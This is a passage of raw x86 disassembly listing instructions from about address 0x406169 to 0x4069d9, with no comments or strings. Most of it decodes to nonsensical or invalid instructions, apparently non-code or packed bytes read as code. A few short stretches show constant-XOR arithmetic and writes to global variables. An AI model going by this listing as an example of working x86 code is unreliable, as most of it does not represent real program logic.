  406169:	mov    al,ds:0x3d7a046e
  40616e:	out    0x9b,eax
  406170:	ins    DWORD PTR es:[edi],dx
  406171:	jae    0x40611f
  406173:	bound  esi,QWORD PTR ds:0xbb751540
  406179:	dec    ebp
  40617a:	sbb    esi,DWORD PTR [edi]
  40617c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40617d:	inc    edx
  40617e:	cld    
  40617f:	xor    esi,DWORD PTR [ebx-0x1b11cae5]
  406185:	icebp  
  406186:	cwde   
  406187:	in     al,0xc
  406189:	fisubr DWORD PTR [edx+0x1e255f00]
  40618f:	push   eax
  406190:	jnp    0x406175
  406192:	mov    gs,ebp
  406194:	adc    BYTE PTR es:[ecx],0x75
  406198:	ret    
  406199:	and    al,bl
  40619b:	dec    esi
  40619c:	cld    
  40619d:	jp     0x406196
  40619f:	and    ecx,DWORD PTR [edi-0x7e]
  4061a2:	pop    edi
  4061a3:	xchg   DWORD PTR [ebx-0x7f5fbed4],eax
  4061a9:	jp     0x4061d6
  4061ab:	(bad)  
  4061ac:	loope  0x4061b0
  4061ae:	add    dh,0x87
  4061b1:	push   0xffffffa0
  4061b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061b4:	xor    bh,BYTE PTR [eax+0x3a033658]
  4061ba:	leave  
  4061bb:	jo     0x4061d8
  4061bd:	into   
  4061be:	pop    ebx
  4061bf:	and    ch,ch
  4061c1:	outs   dx,DWORD PTR ds:[esi]
  4061c2:	sahf   
  4061c3:	pop    edx
  4061c4:	cmp    edi,esp
  4061c6:	nop
  4061c7:	out    dx,al
  4061c8:	or     edi,ebx
  4061ca:	jns    0x406191
  4061cc:	push   esp
  4061cd:	in     al,dx
  4061ce:	inc    edi
  4061cf:	push   edi
  4061d0:	test   eax,0xdcf0bc37
  4061d5:	ror    BYTE PTR cs:[ecx+0x308e6a2a],cl
  4061dc:	mov    ebx,0x6a80c249
  4061e1:	test   dh,dl
  4061e3:	mov    dl,0xa8
  4061e5:	mov    DWORD PTR [edi],ecx
  4061e7:	dec    edx
  4061e8:	mov    esi,0xb9d04c47
  4061ed:	lds    eax,FWORD PTR [ecx]
  4061ef:	adc    dh,al
  4061f1:	inc    eax
  4061f2:	test   al,0x22
  4061f4:	mov    edx,0x69f32fc6
  4061f9:	mov    ecx,0x104215d4
  4061fe:	cld    
  4061ff:	lea    edx,[ebx-0x7c]
  406202:	in     eax,0xe7
  406204:	pop    es
  406205:	dec    esp
  406206:	cmp    DWORD PTR [edx-0x4371d10],eax
  40620c:	idiv   cl
  40620e:	cwde   
  40620f:	inc    eax
  406210:	retf   
  406211:	jae    0x40619d
  406213:	aad    0xfd
  406215:	lods   al,BYTE PTR ds:[esi]
  406216:	(bad)  
  406217:	shl    DWORD PTR [ebx-0xac5cf94],1
  40621d:	idiv   DWORD PTR [ebx]
  40621f:	xor    ebx,ebx
  406221:	sbb    esi,ebp
  406223:	xchg   BYTE PTR [edx],dh
  406225:	out    0x3,al
  406227:	cmc    
  406228:	leave  
  406229:	in     eax,0xaa
  40622b:	fstp   QWORD PTR [ebx-0x31a8cc4c]
  406231:	xor    DWORD PTR [esi],edi
  406233:	inc    ebx
  406234:	adc    eax,DWORD PTR [edi-0x504b31e3]
  40623a:	cmp    DWORD PTR [esi],edx
  40623c:	addr16 cwde 
  40623e:	rol    bh,cl
  406240:	repnz or DWORD PTR [ebx],0xbc8633c0
  406247:	push   esi
  406248:	cmp    ebx,DWORD PTR [esi+0xe11daad]
  40624e:	ins    DWORD PTR es:[edi],dx
  40624f:	ins    DWORD PTR es:[edi],dx
  406250:	and    BYTE PTR [esi+ebp*8+0x6],0x4f
  406255:	in     al,0x46
  406257:	sub    ah,cl
  406259:	call   0x517c:0xad8382e
  406260:	repnz push ds
  406262:	mov    ebp,DWORD PTR [ebx-0x42]
  406265:	inc    ecx
  406266:	and    eax,0x1fb94000
  40626b:	sub    eax,DWORD PTR [edi+0x19]
  40626e:	out    dx,al
  40626f:	fisub  WORD PTR [edi-0x456b1279]
  406275:	xor    dl,al
  406277:	sub    al,0xfd
  406279:	cmp    eax,DWORD PTR [esp+edi*8]
  40627c:	inc    esp
  40627d:	out    0x7d,eax
  40627f:	dec    DWORD PTR [edx-0x61]
  406282:	mov    ch,0xdc
  406284:	fsub   QWORD PTR [esi]
  406286:	jg     0x406283
  406288:	dec    ecx
  406289:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40628a:	dec    eax
  40628b:	mov    ebp,0x6def123e
  406290:	sub    cl,ch
  406292:	inc    edx
  406293:	dec    ebx
  406294:	sti    
  406295:	jmp    0xdee83ddc
  40629a:	imul   esp,DWORD PTR [edi],0xefedb97f
  4062a0:	push   esp
  4062a1:	fild   DWORD PTR [edi+eiz*4-0x51b80be]
  4062a8:	push   edi
  4062a9:	bound  edx,QWORD PTR [edx]
  4062ab:	jne    0x40629f
  4062ad:	int    0x78
  4062af:	and    edi,DWORD PTR [edi+0x618d9e75]
  4062b5:	adc    al,0xf7
  4062b7:	mov    ebp,0x458aa24c
  4062bc:	cmp    al,0xed
  4062be:	es push 0x9f22ba53
  4062c4:	or     edi,DWORD PTR [ecx+0x3a]
  4062c7:	hlt    
  4062c8:	lods   al,BYTE PTR ds:[esi]
  4062c9:	or     al,0x44
  4062cb:	sub    edx,eax
  4062cd:	jp     0x4062e9
  4062cf:	dec    edi
  4062d0:	dec    DWORD PTR [ebx]
  4062d2:	sbb    BYTE PTR [edx+0x6224ba5a],dl
  4062d8:	sub    ecx,DWORD PTR [esi]
  4062da:	push   ebx
  4062db:	xor    eax,0x753e0b35
  4062e0:	daa    
  4062e1:	mov    edi,0xae158d80
  4062e6:	jle    0x406304
  4062e8:	xchg   edx,eax
  4062e9:	fs pop ebx
  4062eb:	push   ebp
  4062ec:	cmp    cl,BYTE PTR [edx+0x1d5f6994]
  4062f2:	xlat   BYTE PTR ds:[ebx]
  4062f3:	fisub  DWORD PTR [eax]
  4062f5:	je     0x4062df
  4062f7:	into   
  4062f8:	call   0x1cfd4b06
  4062fd:	clc    
  4062fe:	clc    
  4062ff:	pop    es
  406300:	and    DWORD PTR ds:0x43072c78,ebx
  406306:	push   cs
  406307:	push   0xf7504887
  40630c:	push   edx
  40630d:	mov    dl,dl
  40630f:	or     DWORD PTR [esi],esp
  406311:	inc    eax
  406312:	(bad)  [edi+0x32]
  406315:	stos   DWORD PTR es:[edi],eax
  406316:	test   eax,0x5a7fd80
  40631b:	dec    eax
  40631c:	mov    edi,0x7469feef
  406321:	mov    WORD PTR [ebx-0x10dfd7bc],ds
  406327:	inc    eax
  406328:	(bad)  [ecx+edi*2]
  40632b:	jmp    0xf86fba9a
  406330:	or     dl,BYTE PTR [esi]
  406332:	aaa    
  406333:	fisttp WORD PTR [edi-0x22]
  406336:	add    esi,DWORD PTR [eax-0x70b4668a]
  40633c:	or     ax,0x84be
  406340:	scas   eax,DWORD PTR es:[edi]
  406341:	mov    al,0xfe
  406343:	add    BYTE PTR [eax-0xb],ch
  406346:	inc    ebx
  406347:	outs   dx,BYTE PTR ds:[esi]
  406348:	mov    dh,BYTE PTR [edi-0x53]
  40634b:	xor    al,0x90
  40634d:	aas    
  40634e:	push   eax
  40634f:	mov    dl,dl
  406351:	inc    ebp
  406352:	scas   eax,DWORD PTR es:[edi]
  406353:	in     eax,dx
  406354:	jmp    0x4062f2
  406356:	call   0x7dc5:0x1f006313
  40635d:	das    
  40635e:	retf   0xf6fe
  406361:	mov    esi,0x9189e93a
  406366:	dec    esp
  406367:	and    dl,BYTE PTR [ecx+ebx*2-0x2e]
  40636b:	pop    esi
  40636c:	aad    0x4b
  40636e:	mov    DWORD PTR [ecx+ebx*4-0x104e0017],edx
  406375:	inc    ecx
  406376:	jb     0x406395
  406378:	cmc    
  406379:	mov    al,ds:0x2f90328f
  40637e:	or     al,dl
  406380:	je     0x406347
  406382:	cmp    BYTE PTR [esi-0x58973ca7],al
  406388:	rol    BYTE PTR [esi+0x5d],0x77
  40638c:	xor    ecx,esi
  40638e:	mov    ah,0x31
  406390:	pop    ss
  406391:	push   esp
  406392:	adc    eax,DWORD PTR [esi+0x40]
  406395:	push   cs
  406396:	(bad)  
  406397:	push   edx
  406398:	mov    ebp,0x4c90c65f
  40639d:	push   eax
  40639e:	add    al,0x64
  4063a0:	imul   edi,DWORD PTR [eax-0x7852263e],0xffffffa1
  4063a7:	pusha  
  4063a8:	test   eax,0x1fc12e53
  4063ad:	hlt    
  4063ae:	aam    0x86
  4063b0:	dec    ebp
  4063b1:	push   ebp
  4063b2:	xor    eax,0xb2d06697
  4063b7:	cmc    
  4063b8:	push   ss
  4063b9:	stos   DWORD PTR es:[edi],eax
  4063ba:	mov    dh,0x54
  4063bc:	add    DWORD PTR [ebx],eax
  4063be:	(bad)  
  4063bf:	ins    DWORD PTR es:[edi],dx
  4063c0:	xchg   esp,eax
  4063c1:	hlt    
  4063c2:	rcr    DWORD PTR [edi],1
  4063c4:	por    mm0,QWORD PTR [esi-0x13ede35f]
  4063cb:	add    eax,0x4bbc8b84
  4063d0:	xor    eax,0x260fa352
  4063d5:	(bad)  
  4063d6:	cmp    eax,0x95356b05
  4063db:	inc    DWORD PTR [ebp-0x11]
  4063de:	cmp    DWORD PTR [ebx+0x601f0c12],ecx
  4063e4:	ret    0x30e6
  4063e7:	lods   al,BYTE PTR ds:[esi]
  4063e8:	lods   eax,DWORD PTR ds:[esi]
  4063e9:	inc    esi
  4063ea:	add    edx,ecx
  4063ec:	sub    DWORD PTR [ebx+0x3defdc51],ebp
  4063f2:	(bad)  
  4063f3:	dec    esi
  4063f4:	sbb    DWORD PTR [eax-0x7e],edx
  4063f7:	xor    DWORD PTR [esi+0x17488d90],edi
  4063fd:	mov    BYTE PTR ds:0x1f54e81c,0xff
  406404:	(bad)  
  406405:	mov    esp,0x65a08e8c
  40640a:	mov    edi,edi
  40640c:	shr    BYTE PTR [edx],0x4c
  40640f:	icebp  
  406410:	cmp    BYTE PTR [esi+0x51],dl
  406413:	cld    
  406414:	ret    0x4707
  406417:	pushf  
  406418:	pop    eax
  406419:	or     DWORD PTR [edx-0x18],eax
  40641c:	call   esp
  40641e:	cmp    ebp,edx
  406420:	jle    0x406431
  406422:	xchg   bh,bh
  406424:	idiv   edi
  406426:	call   FWORD PTR [ebx-0x48]
  406429:	xor    al,BYTE PTR [ebp+0x5e5ff89c]
  40642f:	leave  
  406430:	ret    0xc
  406433:	push   ebp
  406434:	mov    ebp,esp
  406436:	mov    eax,ds:0x41222c
  40643b:	add    DWORD PTR ds:0x430486,edi
  406441:	mov    edx,0x32729d
  406446:	xor    ecx,DWORD PTR ds:0x42e762
  40644c:	sub    eax,edx
  40644e:	inc    DWORD PTR ds:0x430492
  406454:	mov    ecx,0x7510856
  406459:	push   esi
  40645a:	sbb    DWORD PTR ds:0x4304b2,0x57eb
  406464:	mov    esi,DWORD PTR [ebp+0xc]
  406467:	xor    eax,ecx
  406469:	mov    DWORD PTR ds:0x42ee0c,0x533d
  406473:	cmp    eax,esi
  406475:	mov    DWORD PTR ds:0x42e762,0x3465
  40647f:	je     0x406fac
  406485:	mov    eax,ds:0x412224
  40648a:	dec    DWORD PTR ds:0x42e75a
  406490:	jmp    0x40681a
  406495:	fcmovnb st,st(7)
  406497:	dec    esi
  406498:	fild   WORD PTR [edx+0x57]
  40649b:	jnp    0x406498
  40649d:	(bad)  
  40649e:	cmp    ebx,DWORD PTR [esi*8+0x46c3d1f7]
  4064a5:	fidiv  WORD PTR [ebx]
  4064a7:	jle    0x406527
  4064a9:	jmp    0x40651c
  4064ab:	jle    0x40652b
  4064ad:	pop    es
  4064ae:	or     al,0x1c
  4064b0:	mov    bh,0xb7
  4064b2:	dec    ebx
  4064b3:	lahf   
  4064b4:	add    al,0x4b
  4064b6:	(bad)  
  4064b7:	fdiv   st,st(2)
  4064b9:	mov    edi,0x544753f6
  4064be:	xchg   ebx,eax
  4064bf:	or     al,0x82
  4064c1:	cmp    al,0xc7
  4064c3:	sti    
  4064c4:	inc    ebx
  4064c5:	pop    eax
  4064c6:	jo     0x40644c
  4064c8:	and    cl,ah
  4064ca:	xchg   ebx,eax
  4064cb:	push   cs
  4064cc:	aas    
  4064cd:	fist   WORD PTR [eax]
  4064cf:	ror    DWORD PTR [esi-0x3f422b1e],0xad
  4064d6:	fisttp WORD PTR [edi]
  4064d8:	add    BYTE PTR es:[ebx],dh
  4064db:	jo     0x406527
  4064dd:	sub    al,0xbe
  4064df:	sub    eax,0x3ea64a48
  4064e4:	je     0x406506
  4064e6:	repz sub DWORD PTR ds:0x977f5e9a,ebp
  4064ed:	sub    eax,0xdc0c80e6
  4064f2:	adc    al,0x2d
  4064f4:	mov    ebp,0xc3656b71
  4064f9:	dec    esp
  4064fa:	push   ss
  4064fb:	push   ss
  4064fc:	shl    bl,1
  4064fe:	mov    edx,0x60227c07
  406503:	dec    esi
  406504:	jnp    0x4064f2
  406506:	(bad)  
  406507:	test   eax,0x84ff6296
  40650c:	sbb    ebp,esi
  40650e:	jmp    0x1ff3:0x65700259
  406515:	xchg   esp,eax
  406516:	imul   eax,DWORD PTR [esi-0x9],0x5cef794
  40651d:	jmp    0x3c3:0x3dfd373c
  406524:	mov    al,ds:0xbb4efebf
  406529:	mov    bl,0xfa
  40652b:	fld    TBYTE PTR [ecx-0x16]
  40652e:	mov    ecx,0x5403612d
  406533:	mov    al,0xf1
  406535:	mov    DWORD PTR cs:[esi],0xcb6ea7fd
  40653c:	ja     0x4065ab
  40653e:	sahf   
  40653f:	xchg   ebx,eax
  406540:	es push 0x7e
  406543:	cmp    eax,0x4729df48
  406548:	pop    edx
  406549:	add    BYTE PTR [esi-0x15],ah
  40654c:	xor    al,0xe6
  40654e:	pop    ecx
  40654f:	or     edx,esi
  406551:	jmp    0x69497dff
  406556:	cmp    eax,0xcfd18e90
  40655b:	das    
  40655c:	scas   al,BYTE PTR es:[edi]
  40655d:	rcl    BYTE PTR [eax+0x1c770839],0xe7
  406564:	lods   al,BYTE PTR ds:[esi]
  406565:	mov    WORD PTR [esi],ds
  406567:	iret   
  406568:	push   eax
  406569:	adc    al,0x21
  40656b:	fiadd  DWORD PTR [ecx-0x6a]
  40656e:	test   BYTE PTR [eax+0x61],dl
  406571:	xchg   BYTE PTR [edi+0x6c1ddf32],ah
  406577:	pop    eax
  406578:	xchg   esi,esi
  40657a:	mov    bh,al
  40657c:	jle    0x406549
  40657e:	push   ebx
  40657f:	jbe    0x4065fc
  406581:	ret    0x7de2
  406584:	mov    esp,0x3b63d91a
  406589:	cwde   
  40658a:	and    eax,0x37e54991
  40658f:	push   ss
  406590:	mov    BYTE PTR [esi+0x59],dh
  406593:	adc    eax,0x9039143
  406598:	xor    ebp,DWORD PTR [esi-0xf]
  40659b:	das    
  40659c:	pop    eax
  40659d:	cmp    esi,DWORD PTR [edx]
  40659f:	fcomp  DWORD PTR [ebx-0x6a769011]
  4065a5:	adc    al,0x1
  4065a7:	sub    edi,DWORD PTR [ecx]
  4065a9:	iret   
  4065aa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065ab:	mov    dh,0x5e
  4065ad:	inc    ebx
  4065ae:	enter  0xb542,0x12
  4065b2:	xor    esp,DWORD PTR [esi+0x3f]
  4065b5:	jp     0x406555
  4065b7:	cs jle 0x40658e
  4065ba:	rcl    BYTE PTR [ebx+0x28],1
  4065bd:	retf   
  4065be:	test   al,0x14
  4065c0:	jmp    0x6dd5:0x627e18dd
  4065c7:	sub    eax,0x456c9978
  4065cc:	out    0x7e,al
  4065ce:	add    BYTE PTR [eax-0x22],ah
  4065d1:	mov    bh,0x71
  4065d3:	push   ebx
  4065d4:	retf   0xc0ec
  4065d7:	mov    esp,0x7a3387b1
  4065dc:	mov    fs,WORD PTR [edx]
  4065de:	mov    ebx,DWORD PTR [esi+0x65a8408d]
  4065e4:	mov    ch,0x88
  4065e6:	push   edx
  4065e7:	sub    DWORD PTR [eax+0xe8b350a],eax
  4065ed:	ss (bad) 
  4065ef:	cmovg  edi,DWORD PTR [edx+eiz*8-0x159296bd]
  4065f7:	cmc    
  4065f8:	cmp    edx,DWORD PTR [esi]
  4065fa:	sub    DWORD PTR [edx+0x55],ecx
  4065fd:	jb     0x4065b0
  4065ff:	pop    es
  406600:	(bad)  
  406602:	inc    ebp
  406603:	arpl   si,ax
  406605:	mov    dh,0xa6
  406607:	jnp    0x4065cc
  406609:	inc    ebp
  40660a:	fcomp  QWORD PTR [edx]
  40660c:	lea    esp,[eax+ebx*2]
  40660f:	adc    ebx,DWORD PTR [ebx+0x74a2c345]
  406615:	outs   dx,BYTE PTR ds:[esi]
  406616:	call   0x390f:0x4554012b
  40661d:	dec    ebx
  40661e:	xchg   esi,eax
  40661f:	mov    eax,ds:0x64c61764
  406624:	jecxz  0x40661f
  406626:	outs   dx,DWORD PTR ds:[esi]
  406627:	mov    dh,0xdf
  406629:	cmp    bl,al
  40662b:	xchg   esi,eax
  40662c:	imul   eax,DWORD PTR [ecx+0x7],0xfbb3228d
  406633:	je     0x406678
  406635:	out    0x31,eax
  406637:	mov    ds:0x2d58eb62,eax
  40663c:	cmp    dl,0xe7
  40663f:	aaa    
  406640:	and    edi,DWORD PTR [eax+0x7d9288c2]
  406646:	pop    ecx
  406647:	cmp    eax,0x86da0828
  40664c:	sar    BYTE PTR [edx-0x2847bc18],1
  406652:	sub    eax,0xd76ba4fd
  406657:	shl    esi,cl
  406659:	fmul   DWORD PTR [ecx+0x33]
  40665c:	add    eax,0x50a3aae3
  406661:	ds mov ebx,0x284106f4
  406667:	mov    eax,ds:0x88ea0f8b
  40666c:	lea    esi,[ecx+0x2cd33df]
  406672:	push   cs
  406673:	jae    0x406602
  406675:	fidiv  DWORD PTR [esi+ebp*2+0x1033b037]
  40667c:	xchg   ecx,eax
  40667d:	scas   al,BYTE PTR es:[edi]
  40667e:	sub    eax,0x1443e2a4
  406683:	out    0xd2,eax
  406685:	sar    BYTE PTR [edi],1
  406687:	scas   eax,DWORD PTR es:[edi]
  406688:	fisttp DWORD PTR [ebp+ebx*1-0x7d70689b]
  40668f:	xor    edi,DWORD PTR [edx-0x5d]
  406692:	mov    ah,BYTE PTR [ebp+0x4e]
  406695:	cwde   
  406696:	dec    ebx
  406697:	sti    
  406698:	xchg   edi,eax
  406699:	jmp    FWORD PTR [edx]
  40669b:	xor    eax,DWORD PTR [eax+0x52d1cd84]
  4066a1:	push   0x47
  4066a3:	fsubr  DWORD PTR [edi+ebp*2-0x46]
  4066a7:	stos   DWORD PTR es:[edi],eax
  4066a8:	add    eax,0xa5087407
  4066ad:	out    dx,al
  4066ae:	xor    eax,0xc90f1901
  4066b3:	dec    ebp
  4066b4:	addr16 xor esi,ebp
  4066b7:	std    
  4066b8:	outs   dx,DWORD PTR ds:[esi]
  4066b9:	pop    es
  4066ba:	jns    0x406736
  4066bc:	bound  esi,QWORD PTR [edx-0x4a16f08d]
  4066c2:	push   edi
  4066c3:	je     0x40669f
  4066c5:	enter  0xa0f0,0x42
  4066c9:	sbb    edx,0x14
  4066cc:	rcl    BYTE PTR [edx-0x3e],1
  4066cf:	dec    ebx
  4066d0:	out    0x1,al
  4066d2:	cmp    eax,0xbfd1d8d8
  4066d7:	mov    ds:0xee367644,eax
  4066dc:	jae    0x40672a
  4066de:	lea    ebx,[ebp-0x46]
  4066e1:	jecxz  0x4066fc
  4066e3:	sub    DWORD PTR [ebx-0x63965597],esp
  4066e9:	inc    esp
  4066ea:	adc    eax,0x5121857b
  4066ef:	fidivr WORD PTR [ebp+0x5b113f2e]
  4066f5:	sbb    BYTE PTR [esi+0x53],0xdd
  4066f9:	mov    esi,0xd9696deb
  4066fe:	and    DWORD PTR [ecx+0x747be72d],ebp
  406704:	mov    edi,0xc8b4147f
  406709:	aas    
  40670a:	popa   
  40670b:	and    BYTE PTR [ebp*4+0x494ee44e],0x47
  406713:	fidivr DWORD PTR [eax+0x1e]
  406716:	ds addr16 push edi
  406719:	retf   
  40671a:	xchg   esi,eax
  40671b:	dec    ebx
  40671c:	test   eax,0x37d67580
  406721:	arpl   WORD PTR [eax],sp
  406723:	lock sbb al,0x36
  406726:	add    BYTE PTR [ecx],dh
  406728:	pop    esi
  406729:	push   esp
  40672a:	cli    
  40672b:	inc    edi
  40672c:	repnz sbb al,0x2b
  40672f:	or     DWORD PTR [edx],esi
  406731:	xchg   esi,eax
  406732:	iret   
  406733:	mov    al,0x26
  406735:	neg    BYTE PTR [edi]
  406737:	pop    ds
  406738:	add    BYTE PTR [ebp+0x6186f536],dh
  40673e:	test   al,0x81
  406740:	inc    eax
  406741:	cwde   
  406742:	xor    ebp,DWORD PTR [esi+0x1598a3fb]
  406748:	cmc    
  406749:	sub    ebx,esi
  40674b:	mov    BYTE PTR [esi+edx*1-0x6d9729c0],ch
  406752:	shl    ecx,cl
  406754:	dec    edi
  406755:	js     0x40674d
  406757:	outs   dx,DWORD PTR ds:[esi]
  406758:	fwait
  406759:	cli    
  40675a:	arpl   WORD PTR [eax+0x6ee737a3],dx
  406760:	xor    eax,0xba9df93c
  406765:	mov    esi,0x9dbc4022
  40676a:	adc    bh,dl
  40676c:	sub    eax,0x78762269
  406771:	(bad)  [ebx-0x72ab5ce7]
  406777:	sti    
  406778:	and    DWORD PTR [ebx+edi*1],0x88d38fce
  40677f:	jo     0x4067fc
  406781:	xchg   ecx,eax
  406782:	outs   dx,BYTE PTR ds:[esi]
  406783:	and    edx,DWORD PTR [eax-0x74]
  406786:	mov    edi,0x8928882d
  40678b:	stos   BYTE PTR es:[edi],al
  40678c:	(bad)  
  40678d:	call   0x8c59a1a3
  406792:	or     al,BYTE PTR [eax-0x22f7fb19]
  406798:	and    eax,0x12651cce
  40679d:	sub    dl,BYTE PTR [edx]
  40679f:	push   cs
  4067a0:	popf   
  4067a1:	mov    edi,0x99f4b872
  4067a6:	daa    
  4067a7:	jp     0x406786
  4067a9:	daa    
  4067aa:	loopne 0x40682a
  4067ac:	arpl   WORD PTR [eax+0x50285328],bp
  4067b2:	jae    0x40676b
  4067b4:	mov    ah,0x54
  4067b6:	xchg   edi,eax
  4067b7:	and    DWORD PTR [ebp-0x6a],ebx
  4067ba:	retf   
  4067bb:	into   
  4067bc:	fwait
  4067bd:	add    al,0x73
  4067bf:	pop    esi
  4067c0:	mov    edi,ecx
  4067c2:	pushf  
  4067c3:	popa   
  4067c4:	fcomp  st(1)
  4067c6:	pushaw 
  4067c8:	jb     0x40677b
  4067ca:	loopne 0x4067ad
  4067cc:	in     eax,dx
  4067cd:	mov    WORD PTR [ebx+0x54],es
  4067d0:	pop    esi
  4067d1:	stos   DWORD PTR es:[edi],eax
  4067d2:	xor    bl,BYTE PTR ds:0xe11f8d67
  4067d8:	xchg   DWORD PTR [ecx],edi
  4067da:	mov    ds:0xb633ef44,eax
  4067df:	add    BYTE PTR ds:0xf176f819,dl
  4067e5:	sbb    eax,0xbaf7bf51
  4067ea:	test   cl,bh
  4067ec:	test   BYTE PTR [ebp-0x76],dl
  4067ef:	lds    esp,FWORD PTR [esi]
  4067f1:	push   ss
  4067f2:	popa   
  4067f3:	xor    ebp,DWORD PTR ds:[edi+0xc]
  4067f7:	push   0x11ec684e
  4067fc:	mov    ecx,0x330e544d
  406801:	sub    al,0x3b
  406803:	sbb    BYTE PTR [ebx-0x1a6327fd],ah
  406809:	and    eax,0xd3978287
  40680e:	xchg   edx,esi
  406810:	test   ebx,0x3d2d1191
  406816:	and    al,0x45
  406818:	cdq    
  406819:	mov    ebx,0x810c758b
  40681e:	sbb    eax,0x42ee24
  406823:	stos   BYTE PTR es:[edi],al
  406824:	add    al,0x43
  406826:	add    BYTE PTR [ebx],ch
  406828:	ret    0xc133
  40682b:	mov    DWORD PTR ds:0x430552,0x4727
  406835:	cmp    eax,esi
  406837:	mov    DWORD PTR ds:0x42ee1c,0x846
  406841:	jne    0x406867
  406847:	add    eax,DWORD PTR ds:0x43053e
  40684d:	mov    eax,ds:0x41222c
  406852:	add    eax,DWORD PTR ds:0x412224
  406858:	mov    DWORD PTR ds:0x4304ba,0x6a19
  406862:	jmp    0x406878
  406867:	mov    eax,DWORD PTR [ebp+0xc]
  40686a:	xor    DWORD PTR ds:0x430556,0x43049a
  406874:	xor    eax,ecx
  406876:	add    eax,edx
  406878:	mov    DWORD PTR ds:0x42ee24,0x1bc3
  406882:	jmp    0x406c0c
  406887:	xchg   BYTE PTR [ecx],dh
  406889:	fcmove st,st(5)
  40688b:	pop    ebp
  40688c:	fstp   QWORD PTR [ecx-0x3833e0bb]
  406892:	dec    esi
  406893:	popf   
  406894:	pop    ebx
  406895:	mov    BYTE PTR [edx],dh
  406897:	dec    ebx
  406898:	ss jle 0x406919
  40689b:	jmp    0x40690e
  40689d:	jle    0x40691d
  40689f:	addr16 mov bl,0xf0
  4068a2:	shr    BYTE PTR [edx],0xa9
  4068a5:	sub    al,dh
  4068a7:	mov    dh,0x70
  4068a9:	inc    edi
  4068aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068ab:	dec    ebp
  4068ac:	and    eax,0x3ac64f8d
  4068b1:	enter  0xe498,0xbb
  4068b5:	data16 into 
  4068b7:	jnp    0x4068a0
  4068b9:	xchg   ebx,eax
  4068ba:	aam    0x37
  4068bc:	xchg   ebx,eax
  4068bd:	dec    eax
  4068be:	or     DWORD PTR [edi],edx
  4068c0:	dec    ebp
  4068c1:	xor    dh,al
  4068c3:	pop    eax
  4068c4:	imul   edx,DWORD PTR [ecx],0x2f8ab0f6
  4068ca:	pop    edi
  4068cb:	lds    eax,FWORD PTR [edx+0x298e24da]
  4068d1:	xlat   BYTE PTR ds:[ebx]
  4068d2:	inc    ecx
  4068d3:	fimul  WORD PTR [eax-0xc32af27]
  4068d9:	push   cs
  4068da:	les    ebx,FWORD PTR [ecx+0x14acce09]
  4068e0:	mov    bh,0xba
  4068e2:	add    BYTE PTR [edi-0x78],ah
  4068e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068e6:	in     al,dx
  4068e7:	ins    DWORD PTR es:[edi],dx
  4068e8:	enter  0xdab4,0xb0
  4068ec:	shl    ebp,cl
  4068ee:	jg     0x4068ae
  4068f0:	or     eax,0xdfb11920
  4068f5:	jne    0x4068d8
  4068f7:	add    eax,0x486db2be
  4068fc:	mov    bl,0xef
  4068fe:	and    ch,dh
  406900:	int3   
  406901:	push   ecx
  406902:	leave  
  406903:	mov    edi,0xdab1ed36
  406908:	or     ebp,DWORD PTR [eax+0x5d]
  40690b:	adc    DWORD PTR [edx-0x7b],esi
  40690e:	adc    eax,0x4224d39a
  406913:	out    dx,eax
  406914:	nop
  406915:	clc    
  406916:	fcom   DWORD PTR [ebp-0x71]
  406919:	pusha  
  40691a:	xchg   esp,eax
  40691b:	mov    BYTE PTR [ecx-0x1e2e5b54],al
  406921:	ins    BYTE PTR es:[edi],dx
  406922:	adc    al,0x50
  406924:	daa    
  406925:	xor    eax,0x54828524
  40692a:	push   0xcc53a4fd
  40692f:	jp     0x4068dd
  406931:	into   
  406932:	and    al,0x82
  406934:	js     0x40698c
  406936:	jge    0x406949
  406938:	cmc    
  406939:	fsub   DWORD PTR [bp+di]
  40693c:	jno    0x406911
  40693e:	adc    eax,0xa8207971
  406943:	adc    al,0x8d
  406945:	sub    BYTE PTR [esi+edx*1],cl
  406948:	jg     0x406945
  40694a:	cs cli 
  40694c:	xlat   BYTE PTR ds:[ebx]
  40694d:	mov    dh,0x6b
  40694f:	sbb    al,0x13
  406951:	(bad)  
  406952:	call   0xac6bfb82
  406957:	lds    ebp,FWORD PTR [ecx+0x57c8735e]
  40695d:	mov    ecx,0xc306b07d
  406962:	mov    ds:0xdcd6fb5c,al
  406967:	pop    ecx
  406968:	sub    BYTE PTR [ebx],ah
  40696a:	rcr    DWORD PTR [ebp-0x6cbe482e],1
  406970:	adc    al,0x39
  406972:	pop    es
  406973:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406974:	cs inc esp
  406976:	xchg   ebx,eax
  406977:	mov    ecx,0xbe102d26
  40697c:	pop    edx
  40697d:	pop    ss
  40697e:	outs   dx,BYTE PTR ds:[esi]
  40697f:	push   ecx
  406980:	int    0x94
  406982:	idiv   DWORD PTR [ebp+0x3ed27f88]
  406988:	stos   DWORD PTR es:[edi],eax
  406989:	push   esi
  40698a:	adc    DWORD PTR [ebp-0x30b0b06e],esi
  406990:	mov    ah,0x9b
  406992:	icebp  
  406993:	pusha  
  406994:	pop    esp
  406995:	rol    BYTE PTR [ecx-0x7c942199],cl
  40699b:	pop    ebx
  40699c:	inc    edx
  40699d:	pop    edx
  40699e:	popf   
  40699f:	push   ebp
  4069a0:	mov    dl,0xf0
  4069a2:	sbb    DWORD PTR ds:0x1cf91062,esi
  4069a8:	and    al,0x84
  4069aa:	pushf  
  4069ab:	xor    ebx,DWORD PTR [ecx+eiz*8]
  4069ae:	jns    0x4069e5
  4069b0:	jo     0x40693e
  4069b2:	adc    ebp,DWORD PTR [eax-0xbff8703]
  4069b8:	mov    ch,dh
  4069ba:	pop    ss
  4069bb:	(bad)  
  4069bc:	push   ebp
  4069bd:	mov    ah,BYTE PTR [edx-0x78]
  4069c0:	sub    dl,BYTE PTR [edi+0x41]
  4069c3:	cs xchg esp,eax
  4069c5:	adc    BYTE PTR es:[edi+ebx*4-0x209e38b3],cl
  4069cd:	xor    bh,BYTE PTR [esi-0x21]
  4069d0:	ss cwde 
  4069d2:	cdq    
  4069d3:	sbb    ebp,DWORD PTR [ecx]
  4069d5:	jb     0x406966
  4069d7:	mov    bl,0x97
  4069d9:	imul   ebp,DWORD PTR [ebp-0xa]
